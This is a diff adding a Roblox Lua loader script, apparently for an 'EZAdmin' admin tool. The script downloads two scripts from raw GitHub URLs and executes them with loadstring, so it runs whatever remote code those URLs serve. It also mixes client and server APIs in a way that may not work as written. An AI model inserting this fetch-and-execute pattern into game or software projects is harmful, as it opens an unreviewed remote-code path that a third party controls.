@@ -1,0 +1,34 @@
+print('loaded builderClient')
+
+local HttpService = game:GetService("HttpService")
+local admin = 125785010
+	
+local clientUrl = 'https://raw.githubusercontent.com/zzraawashere/EZAdmin/main/client'
+local guiUrl = 'https://raw.githubusercontent.com/zzraawashere/EZAdmin/main/gui'
+
+local function fetchAndExecuteScript(url, context)
+	local success, response = pcall(function()
+		return HttpService:GetAsync(url)
+	end)
+	
+	if success then
+		local executeScript = loadstring(response)
+		if executeScript then
+			if context == "Server" then
+				executeScript()
+			else
+				executeScript(context)
+			end
+		else
+			warn("Failed to create function from URL: " .. url)
+		end
+	else
+		warn("Failed to fetch data from URL: " .. url)
+	end
+end
+
+local playerGui = game.Players.LocalPlayer:WaitForChild('PlayerGui')
+ 
+fetchAndExecuteScript(guiUrl, "playerGui")
+wait(5)
+fetchAndExecuteScript(clientUrl, "playerGui")
